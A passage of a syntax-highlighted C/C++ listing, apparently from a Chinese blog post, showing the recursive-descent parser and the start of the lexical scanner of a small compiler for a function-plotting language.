class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> left<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//一元加减运算Factor的递归子程序</span><span class="token comment">//因子则可能是一个标识符或一个数字，或是一个以括号括起来的子表达式</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Factor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>left<span class="token punctuation">,</span> <span class="token operator">*</span>right<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type <span class="token operator">==</span> PLUS<span class="token punctuation">)</span><span class="token comment">//匹配一元加运算</span><span class="token punctuation">&#123;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>PLUS<span class="token punctuation">)</span><span class="token punctuation">;</span>right <span class="token operator">=</span> <span class="token function">Factor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type <span class="token operator">==</span> MINUS<span class="token punctuation">)</span><span class="token comment">//表达式退化为仅有右操作数的表达式</span><span class="token punctuation">&#123;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>MINUS<span class="token punctuation">)</span><span class="token punctuation">;</span>right <span class="token operator">=</span> <span class="token function">Factor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>left <span class="token operator">=</span> new ExprNode<span class="token punctuation">;</span>left<span class="token operator">-></span>OpCode <span class="token operator">=</span> CONST_ID<span class="token punctuation">;</span>left<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseConst <span class="token operator">=</span> <span class="token number">0.0</span><span class="token punctuation">;</span>right <span class="token operator">=</span> <span class="token function">MakeExprNode</span><span class="token punctuation">(</span>MINUS<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> right <span class="token operator">=</span> <span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//匹配非终结符Component</span><span class="token keyword">return</span> right<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//幂运算表达式Component的递归子程序</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">//右结合</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>left<span class="token punctuation">,</span> <span class="token operator">*</span>right<span class="token punctuation">;</span>left <span class="token operator">=</span> <span class="token function">Atom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type <span class="token operator">==</span> POWER<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>POWER<span class="token punctuation">)</span><span class="token punctuation">;</span>right <span class="token operator">=</span> <span class="token function">Component</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//递归调用Component以实现POWER的右结合</span>left <span class="token operator">=</span> <span class="token function">MakeExprNode</span><span class="token punctuation">(</span>POWER<span class="token punctuation">,</span> left<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> left<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//原子表达式Atom的递归子程序，包括分隔符 函数 常数 参数</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token function">Atom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">Token</span> t <span class="token operator">=</span> token<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>address<span class="token punctuation">,</span> <span class="token operator">*</span>tmp<span class="token punctuation">;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>type<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> CONST_ID<span class="token operator">:</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>CONST_ID<span class="token punctuation">)</span><span class="token punctuation">;</span>address <span class="token operator">=</span> <span class="token function">MakeExprNode</span><span class="token punctuation">(</span>CONST_ID<span class="token punctuation">,</span> t<span class="token punctuation">.</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> T<span class="token operator">:</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span>address <span class="token operator">=</span> <span class="token function">MakeExprNode</span><span class="token punctuation">(</span>T<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> FUNC<span class="token operator">:</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>FUNC<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>L_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span>tmp <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">Tree_trace</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>address <span class="token operator">=</span> <span class="token function">MakeExprNode</span><span class="token punctuation">(</span>FUNC<span class="token punctuation">,</span> t<span class="token punctuation">.</span>FuncPtr<span class="token punctuation">,</span> tmp<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>R_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> L_BRACKET<span class="token operator">:</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>L_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span>address <span class="token operator">=</span> <span class="token function">Expression</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">Tree_trace</span><span class="token punctuation">(</span>address<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">MatchToken</span><span class="token punctuation">(</span>R_BRACKET<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token operator">:</span><span class="token function">SyntaxError</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> address<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//生成语法树的一个节点，接收可变参数列表</span><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span> <span class="token function">MakeExprNode</span><span class="token punctuation">(</span><span class="token keyword">enum</span> <span class="token class-name">Token_Type</span> opcode<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token comment">//注意这个函数是一个可变参数的函数</span><span class="token punctuation">&#123;</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span>ExprPtr <span class="token operator">=</span> <span class="token function">new</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//为新节点开辟空间</span>ExprPtr<span class="token operator">-></span>OpCode <span class="token operator">=</span> opcode<span class="token punctuation">;</span><span class="token comment">//向节点写入记号类别</span>va_list ArgPtr<span class="token punctuation">;</span><span class="token comment">//指向可变函数的参数的指针</span><span class="token function">va_start</span><span class="token punctuation">(</span>ArgPtr<span class="token punctuation">,</span> opcode<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//初始化va_list变量，第一个参数也就是固定参数为opcode</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>opcode<span class="token punctuation">)</span><span class="token comment">//根据记号的类别构造不同的节点</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> CONST_ID<span class="token operator">:</span><span class="token comment">//常数节点</span>ExprPtr<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseConst <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span><span class="token function">va_arg</span><span class="token punctuation">(</span>ArgPtr<span class="token punctuation">,</span> <span class="token keyword">double</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//返回可变参数，可变参数类型是常数</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> T<span class="token operator">:</span><span class="token comment">//参数T节点</span>ExprPtr<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseParmPtr <span class="token operator">=</span> <span class="token operator">&amp;</span>Parameter<span class="token punctuation">;</span><span class="token comment">//返回可变参数，可变参数类型是参数T</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> FUNC<span class="token operator">:</span><span class="token comment">//函数调用节点</span>ExprPtr<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseFunc<span class="token punctuation">.</span>MathFuncPtr <span class="token operator">=</span> <span class="token punctuation">(</span>FuncPtr<span class="token punctuation">)</span><span class="token function">va_arg</span><span class="token punctuation">(</span>ArgPtr<span class="token punctuation">,</span> FuncPtr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//可变参数类型是对应函数的指针</span>ExprPtr<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseFunc<span class="token punctuation">.</span>Child <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">va_arg</span><span class="token punctuation">(</span>ArgPtr<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//可变参数类型是节点</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">default</span><span class="token operator">:</span><span class="token comment">//二元运算节点</span>ExprPtr<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Left <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">va_arg</span><span class="token punctuation">(</span>ArgPtr<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//可变参数类型是节点</span>ExprPtr<span class="token operator">-></span>Content<span class="token punctuation">.</span>CaseOperater<span class="token punctuation">.</span>Right <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">va_arg</span><span class="token punctuation">(</span>ArgPtr<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">ExprNode</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//同上</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">va_end</span><span class="token punctuation">(</span>ArgPtr<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//结束可变参数的获取</span><span class="token keyword">return</span> ExprPtr<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="Scanner-cpp"><a href="#Scanner-cpp" class="headerlink" title="Scanner.cpp"></a>Scanner.cpp</h4><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"scanner.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">TOKEN_LEN</span> <span class="token expression"><span class="token number">100</span></span><span class="token comment">//记号最大长度</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">warning</span><span class="token punctuation">(</span>disable<span class="token operator">:</span> <span class="token number">4996</span><span class="token punctuation">)</span></span></span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> LineNo<span class="token punctuation">;</span><span class="token comment">//源文件行号</span><span class="token keyword">static</span> FILE <span class="token operator">*</span>InFile<span class="token punctuation">;</span><span class="token comment">//输入文件流</span><span class="token keyword">static</span> <span class="token keyword">char</span> TokenBuffer<span class="token punctuation">[</span>TOKEN_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//记号字符缓冲</span><span class="token comment">//初始化词法分析器</span><span class="token keyword">extern</span> <span class="token keyword">int</span> <span class="token function">InitScanner</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>FileName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>LineNo <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//行号</span>InFile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>FileName<span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//只读形式打开文件</span><span class="token keyword">if</span> <span class="token punctuation">(</span>InFile <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//打开成功</span><span class="token keyword">else</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//打开失败</span><span class="token punctuation">&#125;</span><span class="token comment">//关闭词法分析器</span><span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">CloseScanner</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>InFile <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token function">fclose</span><span class="token punctuation">(</span>InFile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//关闭文件</span><span class="token punctuation">&#125;</span><span class="token comment">//从输入源程序（流）读字符</span><span class="token keyword">static</span> <span class="token keyword">char</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">char</span> Char <span class="token operator">=</span> <span class="token function">getc</span><span class="token punctuation">(</span>InFile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//逐个字符读</span><span class="token keyword">return</span> <span class="token function">toupper</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//全部转换为大写，然后return</span><span class="token punctuation">&#125;</span><span class="token comment">//将预读字符退回源程序（流）</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">BackChar</span><span class="token punctuation">(</span><span class="token keyword">char</span> Char<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token function">ungetc</span><span class="token punctuation">(</span>Char<span class="token punctuation">,</span> InFile<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//加入字符到记号缓冲区</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">AddCharTokenString</span><span class="token punctuation">(</span><span class="token keyword">char</span> Char<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> TokenLength <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>TokenBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>TokenLength <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">>=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>TokenBuffer<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">//数组越界</span>TokenBuffer<span class="token punctuation">[</span>TokenLength<span class="token punctuation">]</span> <span class="token operator">=</span> Char<span class="token punctuation">;</span><span class="token comment">//写入字符到缓冲区</span>TokenBuffer<span class="token punctuation">[</span>TokenLength <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span><span class="token comment">//加入字符串结束标志“\0”</span><span class="token punctuation">&#125;</span><span class="token comment">//请空记号缓冲区</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">EmptyTokenString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">memset</span><span class="token punctuation">(</span>TokenBuffer<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> TOKEN_LEN<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">//判断记号是否在记号表中</span><span class="token keyword">static</span> Token <span class="token function">JudgeKeyToken</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>IDString<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> loop<span class="token punctuation">;</span><span class="token comment">//sizeof(TokenTab)L:表示这个数组一共占了多少字节数;sizeof(TokenTab[0])：表示一个元素所占的字节数,两者相除，表述数组中一共有多少个元素</span><span class="token keyword">for</span> <span class="token punctuation">(</span>loop <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> loop <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>TokenTab<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>TokenTab<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> loop<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//遍历TokenTab表</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>TokenTab<span class="token punctuation">[</span>loop<span class="token punctuation">]</span><span class="token punctuation">.</span>lexeme<span class="token punctuation">,</span> IDString<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">return</span> TokenTab<span class="token punctuation">[</span>loop<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//判断在字符表中就返回该记号</span><span class="token punctuation">&#125;</span>Token errortoken<span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>errortoken<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Token<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//先将errortoken置空</span>errortoken<span class="token punctuation">.</span>type <span class="token operator">=</span> ERRTOKEN<span class="token punctuation">;</span><span class="token comment">//然后填入出错记号</span><span class="token keyword">return</span> errortoken<span class="token punctuation">;</span><span class="token comment">//返回出错记号</span><span class="token punctuation">&#125;</span><span class="token comment">//获得一个记号</span><span class="token keyword">extern</span> Token <span class="token function">GetToken</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Token token<span class="token punctuation">;</span><span class="token keyword">char</span> Char<span class="token punctuation">;</span><span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>token<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>Token<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//token置空</span><span class="token function">EmptyTokenString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//清空记号缓冲区</span>token<span class="token punctuation">.</span>lexeme <span class="token operator">=</span> TokenBuffer<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token comment">//此循环用来过滤掉源程序中的空格、TAB、回车等分隔符，文件结束返回空记号</span><span class="token punctuation">&#123;</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//从源程序读字符</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span><span class="token comment">//读出错</span><span class="token punctuation">&#123;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> NONTOKEN<span class="token punctuation">;</span><span class="token keyword">return</span> token<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token char">'\n'</span><span class="token punctuation">)</span>LineNo<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//行号+1</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isspace</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//遇到空格该记号肯定已经完成，退出循环</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">AddCharTokenString</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//如果不是上面的那些分隔符，就先加入缓冲区</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isalpha</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//如果是英文字母，一定是函数、关键字、PI、E等</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isalnum</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//如果是字母或数字</span><span class="token function">AddCharTokenString</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//加入缓冲区</span><span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//退回缓冲区</span>token <span class="token operator">=</span> <span class="token function">JudgeKeyToken</span><span class="token punctuation">(</span>TokenBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//判断是否在记号表中</span>token<span class="token punctuation">.</span>lexeme <span class="token operator">=</span> TokenBuffer<span class="token punctuation">;</span><span class="token keyword">return</span> token<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isdigit</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">//如果是数字，一定是常量</span><span class="token punctuation">&#123;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isdigit</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">AddCharTokenString</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token char">'.'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">AddCharTokenString</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isdigit</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token function">AddCharTokenString</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> CONST_ID<span class="token punctuation">;</span>token<span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token function">atof</span><span class="token punctuation">(</span>TokenBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> token<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token comment">//如果是其他符号</span><span class="token punctuation">&#123;</span><span class="token keyword">switch</span> <span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">case</span> <span class="token char">';'</span><span class="token operator">:</span> token<span class="token punctuation">.</span>type <span class="token operator">=</span> SEMICO<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'('</span><span class="token operator">:</span> token<span class="token punctuation">.</span>type <span class="token operator">=</span> L_BRACKET<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">')'</span><span class="token operator">:</span> token<span class="token punctuation">.</span>type <span class="token operator">=</span> R_BRACKET<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">','</span><span class="token operator">:</span> token<span class="token punctuation">.</span>type <span class="token operator">=</span> COMMA<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'+'</span><span class="token operator">:</span> token<span class="token punctuation">.</span>type <span class="token operator">=</span> PLUS<span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token keyword">case</span> <span class="token char">'-'</span><span class="token operator">:</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token char">'-'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>Char <span class="token operator">!=</span> <span class="token char">'\n'</span> <span class="token operator">&amp;&amp;</span> Char <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token function">GetToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span class="token punctuation">;</span>token<span class="token punctuation">.</span>type <span class="token operator">=</span> MINUS<span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">case</span> <span class="token char">'/'</span><span class="token operator">:</span>Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>Char <span class="token operator">==</span> <span class="token char">'/'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span> <span class="token punctuation">(</span>Char <span class="token operator">!=</span> <span class="token char">'\n'</span> <span class="token operator">&amp;&amp;</span> Char <span class="token operator">!=</span> <span class="token constant">EOF</span><span class="token punctuation">)</span> Char <span class="token operator">=</span> <span class="token function">GetChar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">BackChar</span><span class="token punctuation">(</span>Char<span class="token punctuation">)</span><span 